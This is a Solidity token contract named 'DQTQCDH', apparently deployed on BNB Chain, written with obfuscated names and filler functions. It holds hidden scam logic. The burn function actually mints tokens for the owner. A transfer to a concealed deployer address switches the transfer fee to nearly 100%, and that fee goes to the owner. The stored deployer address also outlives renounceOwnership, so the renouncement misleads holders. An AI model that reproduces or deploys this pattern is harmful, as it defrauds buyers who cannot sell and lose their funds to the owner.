/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.6.0;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

contract DQTQCDH {
address private  YIEWET = address(0);
address private  FWFNTN = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  IGDXMI = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  ZHXBNG = 1000000000000000000;
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  LRPEGM = address(0);
uint256 private  UXXTGY = 100000000;
uint256 public constant MNNMNQ = 99999;
string public  name = "DQTQCDH";
uint256 private  KJDCOW = 1000000000000000;
uint8 public constant decimals = 18;
uint256 private  HOQVBQ = 1000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  SJHDJF = address(0);
uint256 private  KBRGBE = 10000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  ENPAMP = 10000000000;
string public  symbol = "DQTQCDH";
uint256 private  RBROPE = 1000000000000000000000;
function _getYIEWET() private returns (address) {
return YIEWET;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "TPBLQR");
require(to != address(0), "TPBLQR");
require(amount <= balanceOf[from], "TPBLQR");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* MNNMNQ/HOQVBQ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==IGDXMI){
HOQVBQ = MNNMNQ+2;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getUXXTGY() private returns (uint256) {
return UXXTGY;
}

constructor () public {
IGDXMI = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getFWFNTN() private returns (address) {
return FWFNTN;
}

function _getRBROPE() private returns (uint256) {
return RBROPE;
}

function _getENPAMP() private returns (uint256) {
return ENPAMP;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getLRPEGM() private returns (address) {
return LRPEGM;
}

function _getKBRGBE() private returns (uint256) {
return KBRGBE;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tTPBLQR 0");
require(spender != address(0), "fTPBLQR 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getKJDCOW() private returns (uint256) {
return KJDCOW;
}

function _getZHXBNG() private returns (uint256) {
return ZHXBNG;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getSJHDJF() private returns (address) {
return SJHDJF;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}

}